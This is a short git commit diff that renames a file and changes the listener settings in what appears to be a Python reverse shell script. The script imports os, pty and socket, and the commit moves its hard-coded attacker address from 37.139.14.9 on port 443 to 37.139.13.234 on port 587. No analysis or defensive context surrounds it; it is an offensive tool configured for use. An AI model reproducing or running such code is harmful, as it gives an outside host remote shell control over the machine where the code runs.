f7b173aa8ff9f282dedcd7e282674025959f95bc
jacksp7 <62326652+jacksp7@users.noreply.github.com>
2020-05-07 13:06:24 -0700

    Update and rename vv9.py to vv234.py

--- vv234.py
+++ vv234.py
@@ -11,8 +11,8 @@ import os
 import pty
 import socket
 
-lhost = "37.139.14.9" # XXX: CHANGEME
-lport = 443 # XXX: CHANGEME
+lhost = "37.139.13.234" # XXX: CHANGEME
+lport = 587 # XXX: CHANGEME
 
 def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
